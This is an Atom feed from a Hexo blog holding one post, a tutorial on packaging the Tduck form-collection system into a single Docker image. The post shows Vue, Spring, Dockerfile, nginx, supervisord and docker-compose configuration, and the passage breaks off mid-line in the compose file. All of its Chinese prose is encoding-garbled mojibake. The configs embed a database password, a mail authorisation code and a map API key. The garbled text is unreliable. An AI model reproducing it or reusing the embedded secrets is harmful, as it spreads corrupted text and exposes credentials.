<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>åŒ—ææµ·çš„åšå®¢ç©ºé—´</title>
  
  <subtitle>You do things when the opportunities come along.</subtitle>
  <link href="https://lhhxs.github.io/atom.xml" rel="self"/>
  
  <link href="https://lhhxs.github.io/"/>
  <updated>2022-09-17T11:58:07.940Z</updated>
  <id>https://lhhxs.github.io/</id>
  
  <author>
    <name>Arcticsea</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰</title>
    <link href="https://lhhxs.github.io/2022/09/17/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88docker%E7%AF%87%EF%BC%89/"/>
    <id>https://lhhxs.github.io/2022/09/17/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88docker%E7%AF%87%EF%BC%89/</id>
    <published>2022-09-17T10:54:52.487Z</published>
    <updated>2022-09-17T11:58:07.940Z</updated>
    
    <content type="html"><![CDATA[<h1 id="åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰"><a href="#åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰" class="headerlink" title="åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰"></a>åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆdockerç¯‡ï¼‰</h1><p>ä¸æ­¢ä¸€ä¸ªäººåœ¨å¾®ä¿¡å…¬ä¼—å·ç»™æˆ‘å‘é€ <code>tduck</code> ï¼Œæ‰€ä»¥è€è‹å†³å®šå†ç ”ç©¶ä¸‹ <code>docker</code> ç‰ˆ</p><blockquote><p>ä¹‹å‰è€è‹å·²å†™è¿‡åŸºäº <code>CentOS</code> çš„å®‰è£…æ–¹æ³•</p><ul><li><a href="https://laosu.ml/2021/06/11/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89/">åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆä¸Šç¯‡ï¼‰</a></li><li><a href="https://laosu.ml/2021/06/14/%E5%9C%A8%E7%BA%BF%E8%A1%A8%E5%8D%95%E6%94%B6%E9%9B%86%E7%B3%BB%E7%BB%9FTduck%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89/">åœ¨çº¿è¡¨å•æ”¶é›†ç³»ç»ŸTduckï¼ˆä¸‹ç¯‡ï¼‰</a></li></ul></blockquote><p>æ²¡æœ‰æ‰¾åˆ°å®˜æ–¹çš„é•œåƒï¼Œä¸è¿‡ä½ å¯ä»¥è¯•è¯•ğŸ‘‡</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a834070478c624b70881c765d0ab2831.png"></p><p>è¿™æ˜¯ä¸€ä¸ªå¤šåˆä¸€çš„é•œåƒï¼Œç”¨äºä½“éªŒè¿˜æ˜¯å¯ä»¥çš„ï¼Œå®‰è£…è¯´æ˜å¯ä»¥åœ¨å‚è€ƒæ–‡æ¡£éƒ¨åˆ†æ‰¾åˆ°ï¼Œä½†æ˜¯ä¼¼ä¹å¹¶ä¸æ”¯æŒè®¾ç½®è‡ªå·±çš„é‚®ç®±ã€å¾®ä¿¡å…¬ä¼—å·ç­‰ï¼Œæ‰€ä»¥ä¹Ÿå°±æ²¡åŠæ³•ç”¨è‡ªå·±çš„è´¦å·ç™»å½•äº†ã€‚</p><h1 id="æ„å»ºé•œåƒ"><a href="#æ„å»ºé•œåƒ" class="headerlink" title="æ„å»ºé•œåƒ"></a>æ„å»ºé•œåƒ</h1><blockquote><p>å¦‚æœä½ ä¸æƒ³è‡ªå·±æ„å»ºï¼Œå¯ä»¥è·³è¿‡ï¼Œç›´æ¥é˜…è¯»ä¸‹ä¸€ç« èŠ‚</p></blockquote><p>ç®¡æ–¹æä¾›çš„ <code>dockerfile</code> éœ€è¦ç”¨æˆ·è‡ªå·±å°†åç«¯ç¼–è¯‘çš„ <code>tduck-api.jar</code> æ‹·è´åˆ° <code>docker</code> ç›®å½•ï¼Œå°†å‰ç«¯æ‰“åŒ…åçš„ <code>dist</code> é‡Œçš„æ–‡ä»¶æ‹·è´åˆ° <code>docker/front</code> ç›®å½•ï¼Œè¿™å¾—æŠŠè€è‹ä¹‹å‰å†™çš„æ­å»ºçš„ç¯å¢ƒæ“ä½œå†é‡åšä¸€éï¼Œç€å®æœ‰ç‚¹éº»çƒ¦ï¼Œè€è‹æ›´å¸Œæœ›å®ç°ä»æºä»£ç ç›´æ¥ç¼–è¯‘æ‰“åŒ…é•œåƒï¼Œæ€»ä½“æ€è·¯ç»§æ‰¿äº† <code>YesPlayMusic</code>ï¼ŒæŠŠå‰åç«¯æ‰“è¿›ä¸€ä¸ªé•œåƒï¼Œè¿™æ ·æ¯”è¾ƒæ–¹ä¾¿ <code>nginx</code> åšå‰åç«¯åˆ†æµå¤„ç†</p><p><code>Dockerfile</code> åˆ†ä¸ºäº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œå…¶ä¸­ <code>å‰ç«¯æ„å»º</code> å’Œ <code>åç«¯æ„å»º</code> æ˜¯å¯ä»¥ç‹¬ç«‹ä½¿ç”¨çš„ï¼Œ<code>å‰ç«¯æ„å»º</code> å¯ä»¥ç”Ÿæˆ <code>dist</code>ï¼Œè€Œ <code>åç«¯æ„å»º</code>èƒ½ç”Ÿæˆ <code>tduck-api.jar</code></p><h2 id="ä¿®æ”¹å‰ç«¯fronté…ç½®"><a href="#ä¿®æ”¹å‰ç«¯fronté…ç½®" class="headerlink" title="ä¿®æ”¹å‰ç«¯fronté…ç½®"></a>ä¿®æ”¹å‰ç«¯fronté…ç½®</h2><p>åœ¨masterå’ŒV3ç‰ˆæœ¬åˆ†æ”¯ä¸­tduck-fronté…ç½®æ˜¯å¼€å‘è€…ä½¿ç”¨çš„ï¼Œapiå’Œwebä»¥åŠæµè§ˆå™¨éƒ½æ˜¯åœ¨æœ¬æœºçš„æƒ…å†µä¸‹æœ‰ç”¨ï¼Œå› æ­¤æˆ‘ä»¬è¦åœ¨tduck-frontä¿®æ”¹<code>vue.config.js</code>ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">publicPath</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="attr">lintOnSave</span>: process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>, <span class="comment">//å¯¹åº”.env.production</span></span><br><span class="line">  <span class="attr">productionSourceMap</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">disableHostCheck</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">open</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8888</span>,</span><br><span class="line">    <span class="comment">// å¼€å‘ç¯å¢ƒé»˜è®¤å¼€å¯åå‘ä»£ç†ï¼Œå¦‚æœä¸éœ€è¦è¯·è‡ªè¡Œæ³¨é‡Š</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&#x27;/tduck-api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://localhost:8999&#x27;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>.env.production</code>çš„VUE_APP_API_ROOTé…ç½®</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é¡µé¢æ ‡é¢˜ï¼›xxxxæä¾›æŠ€æœ¯æ”¯æŒ</span></span><br><span class="line"><span class="string">VUE_APP_TITLE</span> <span class="string">=</span> <span class="string">tduck-å¡«é¸­</span></span><br><span class="line"><span class="comment"># æ¥å£è¯·æ±‚åœ°å€ï¼Œä¼šè®¾ç½®åˆ° axios çš„ baseURL å‚æ•°ä¸Š</span></span><br><span class="line"><span class="string">VUE_APP_API_ROOT</span> <span class="string">=</span> <span class="string">/tduck-api</span></span><br><span class="line"><span class="comment"># è°ƒè¯•å·¥å…·ï¼Œå¯è®¾ç½® eruda æˆ– vconsoleï¼Œå¦‚æœä¸éœ€è¦å¼€å¯åˆ™ç•™ç©º</span></span><br><span class="line"><span class="string">VUE_APP_DEBUG_TOOL</span> <span class="string">=</span></span><br><span class="line"><span class="comment"># é«˜å¾·åœ°å›¾key</span></span><br><span class="line"><span class="string">VUE_APP_MAP_KEY</span> <span class="string">=</span> <span class="string">f2200337d0d08538e78729572749882d</span></span><br><span class="line"><span class="comment"># å¾®ä¿¡åŠŸèƒ½å¼€å…³ å¼€å¯è®¾ç½® ONï¼Œå…³é—­è®¾ç½® OFF</span></span><br><span class="line"><span class="string">VUE_APP_WX</span> <span class="string">=</span> <span class="string">ON</span></span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹åç«¯APIé…ç½®"><a href="#ä¿®æ”¹åç«¯APIé…ç½®" class="headerlink" title="ä¿®æ”¹åç«¯APIé…ç½®"></a>ä¿®æ”¹åç«¯APIé…ç½®</h2><p>æ‰¾åˆ°æ–‡ä»¶<code>tduck-platform/tduck-api/src/main/resources/application.yml</code>ï¼Œä¿®æ”¹ä»¥ä¸‹é…ç½®ï¼š</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">tduck-api</span></span><br><span class="line">  <span class="attr">profiles:</span></span><br><span class="line">    <span class="attr">active:</span> <span class="string">prod</span> <span class="comment">#å¯¹åº”application-prod.yml æ–‡ä»¶é…ç½®</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">GMT+8</span></span><br><span class="line">    <span class="attr">date-format:</span> <span class="string">yyyy-MM-dd</span> <span class="string">HH:mm:ss</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">smtp.88.com</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">465</span></span><br><span class="line">    <span class="attr">protocol:</span> <span class="string">smtps</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">multipart:</span></span><br><span class="line">      <span class="attr">max-file-size:</span> <span class="string">100MB</span></span><br><span class="line">      <span class="attr">max-request-size:</span> <span class="string">100MB</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">ehcache:</span></span><br><span class="line">      <span class="attr">config:</span> <span class="string">classpath:ehcache.xml</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8999</span></span><br><span class="line">  <span class="comment">#å¢åŠ ä¸Šä¸‹æ–‡ç›®å½•</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/tduck-api</span></span><br><span class="line">  <span class="attr">compression:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">mime-types:</span> <span class="string">application/javascript,text/css,application/json,application/xml,text/html,text/xml,text/plain</span></span><br></pre></td></tr></table></figure><p>é…ç½®application-prod.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://tduck-mysql:3306/tduck?useSSL=false&amp;useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=UTC&amp;tinyInt1isBit=false</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">abc123123</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">com.zaxxer.hikari.HikariDataSource</span></span><br><span class="line">    <span class="attr">hikari:</span></span><br><span class="line">      <span class="attr">minimum-idle:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">maximum-pool-size:</span> <span class="number">15</span></span><br><span class="line">      <span class="attr">auto-commit:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">idle-timeout:</span> <span class="number">30000</span></span><br><span class="line">      <span class="attr">pool-name:</span> <span class="string">DatebookHikariCP</span></span><br><span class="line">      <span class="attr">max-lifetime:</span> <span class="number">1800000</span></span><br><span class="line">      <span class="attr">connection-test-query:</span> <span class="string">SELECT</span> <span class="number">1</span> <span class="string">FROM</span> <span class="string">DUAL</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">database:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">tduck-redis</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">password:</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="string">6000ms</span>  <span class="comment"># è¿æ¥è¶…æ—¶æ—¶é•¿ï¼ˆæ¯«ç§’ï¼‰</span></span><br><span class="line">    <span class="attr">jedis:</span></span><br><span class="line">      <span class="attr">pool:</span></span><br><span class="line">        <span class="attr">max-active:</span> <span class="number">1000</span>  <span class="comment"># è¿æ¥æ± æœ€å¤§è¿æ¥æ•°ï¼ˆä½¿ç”¨è´Ÿå€¼è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ï¼‰</span></span><br><span class="line">        <span class="attr">max-wait:</span> <span class="string">-1ms</span>      <span class="comment"># è¿æ¥æ± æœ€å¤§é˜»å¡ç­‰å¾…æ—¶é—´ï¼ˆä½¿ç”¨è´Ÿå€¼è¡¨ç¤ºæ²¡æœ‰é™åˆ¶ï¼‰</span></span><br><span class="line">        <span class="attr">max-idle:</span> <span class="number">10</span>      <span class="comment"># è¿æ¥æ± ä¸­çš„æœ€å¤§ç©ºé—²è¿æ¥</span></span><br><span class="line">        <span class="attr">min-idle:</span> <span class="number">5</span>       <span class="comment"># è¿æ¥æ± ä¸­çš„æœ€å°ç©ºé—²è¿æ¥</span></span><br><span class="line">  <span class="attr">mail:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">smtp.163.com</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">test@163.com</span>  <span class="comment"># é‚®ç®±è´¦å·</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">DSXFPX24XOBURMDY</span> <span class="comment">#é‚®ç®±æˆæƒç </span></span><br></pre></td></tr></table></figure><h2 id="é•œåƒæ„å»º"><a href="#é•œåƒæ„å»º" class="headerlink" title="é•œåƒæ„å»º"></a>é•œåƒæ„å»º</h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‰ç«¯æ„å»º</span></span><br><span class="line"><span class="keyword">FROM</span> node:<span class="number">16.5</span> as build-front</span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> maintainer=laosu&lt;wbsu2003@gmail.com&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> /tduck-front/package.json ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install -g cnpm --registry=https://registry.npm.taobao.org</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> /tduck-front/. ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> cnpm install</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> cnpm run build</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åç«¯æ„å»º</span></span><br><span class="line"><span class="keyword">FROM</span> maven:<span class="number">3.6</span>.<span class="number">0</span>-jdk-<span class="number">11</span>-slim AS build_end</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> mvn -f /tduck-platform/pom.xml clean package -DskipTests</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•´ä½“æ‰“åŒ…</span></span><br><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">11</span>-jre-slim</span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i s@/deb.debian.org/@/mirrors.aliyun.com/@g /etc/apt/sources.list \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get clean \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install -y supervisor nginx</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## nginx</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build_end ./nginx.conf /etc/nginx/nginx.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## supervisor</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build_end ./supervisord.conf /etc/supervisord.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## å‰ç«¯é™æ€æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build-front /app/dist/ /usr/share/nginx/html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## åç«¯jaråŒ…</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=build_end /tduck-platform/tduck-api/target/tduck-api.jar /usr/local/lib/tduck-api.jar</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8999</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;supervisord&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;/etc/supervisord.conf&quot;</span>] </span></span><br></pre></td></tr></table></figure><p><code>nginx</code> è®¾ç½®æ–‡ä»¶ <code>nginx.conf</code> ç”¨çš„æ˜¯å®˜æ–¹çš„ï¼Œåªä¿®æ”¹äº† <code>proxy_pass</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  form.tec-do.com;</span><br><span class="line">        root /usr/share/nginx/html;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">          # é™æ€æ–‡ä»¶åœ°å€ rootè®¿é—®è·¯å¾„ä¼šæŠŠè¯·æ±‚çš„è·¯å¾„å¸¦ä¸Š</span><br><span class="line">            root   /usr/share/nginx/html;</span><br><span class="line">        try_files $uri$args $uri$args/ /index.html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /tduck-api/ &#123;</span><br><span class="line">            proxy_set_header Host $http_host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header REMOTE-HOST $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            proxy_pass http://tduck-app:8999/tduck-api/;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        #error_page   500 502 503 504  /50x.html;</span><br><span class="line">        #location = /50x.html &#123;</span><br><span class="line">        #    root   html;</span><br><span class="line">        #&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><code>supervisord.conf</code> æ–‡ä»¶æ˜¯æ–°å¢ç”¨æ¥æ§åˆ¶è¿›ç¨‹çš„ï¼Œå‰ç«¯ <code>app</code> æ˜¯è¿è¡Œåœ¨ <code>nginx</code> ä¸Šçš„é™æ€é¡µé¢ï¼Œåç«¯ <code>tduck_api</code> åŸºäº <code>jar</code> åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[include]</span><br><span class="line">files = /etc/supervisor/conf.d/*.conf</span><br><span class="line"></span><br><span class="line">[program:app]</span><br><span class="line">command=nginx -g &quot;daemon off;&quot;</span><br><span class="line"></span><br><span class="line">[program:api]</span><br><span class="line">command=java -Dfile.encoding=UTF-8 -jar /usr/local/lib/tduck-api.jar</span><br><span class="line"></span><br><span class="line">#directory will be any folder where you wnat supervisor to cd before executing.</span><br><span class="line">#directory=/project </span><br><span class="line">autostart=true</span><br><span class="line">autorestart=false</span><br><span class="line">startretries=3</span><br><span class="line"></span><br><span class="line">#user will be anyone you want but make sure that user will have the enough privilage.</span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">nodaemon=true</span><br><span class="line">logfile=/tmp/supervisord.log</span><br><span class="line">pidfile=/tmp/supervisord.pid</span><br><span class="line">loglevel=debug</span><br><span class="line">logfile_maxbytes=10MB</span><br><span class="line"></span><br><span class="line">[supervisorctl] </span><br></pre></td></tr></table></figure><p><code>docker-compose.yaml</code> åŸºäºå®˜æ–¹çš„ä¿®æ”¹è€Œæˆï¼Œå› ä¸ºåšäº†å‰åç«¯äºŒåˆä¸€ï¼Œæ‰€ä»¥å»æ‰äº† <code>tduck-front</code>ï¼Œä½†æ˜¯æ–°å¢äº†é‚®ä»¶ç¯å¢ƒå˜é‡ï¼Œåªæ˜¯é»˜è®¤å¹¶æ²¡æœ‰å¯ç”¨</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3.6&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">tduck-app:</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="comment">#      - SPRING_DATASOURCE_DRIVER-CLASS-NAME=com.mysql.cj.jdbc.driver</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_DATASOURCE_URL=$SPRING_DATASOURCE_URL</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_DATASOURCE_USERNAME=$SPRING_DATASOURCE_NAME</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_DATASOURCE_PASSWORD=$MYSQL_ROOT_PASSWORD</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_REDIS_DATABASE=0</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_REDIS_HOST=$REDIS_HOST</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">SPRING_REDIS_PORT=$REDIS_PORT</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">AJ_CAPTCHA_ENABLE=false</span></span><br><span class="line"><span class="comment"># è€è‹æ–°å¢é‚®ä»¶è®¾ç½®</span></span><br><span class="line">    <span class="comment">#  - SPRING_MAIL_HOST=$MAIL_HOST</span></span><br><span class="line">    <span class="comment">#  - 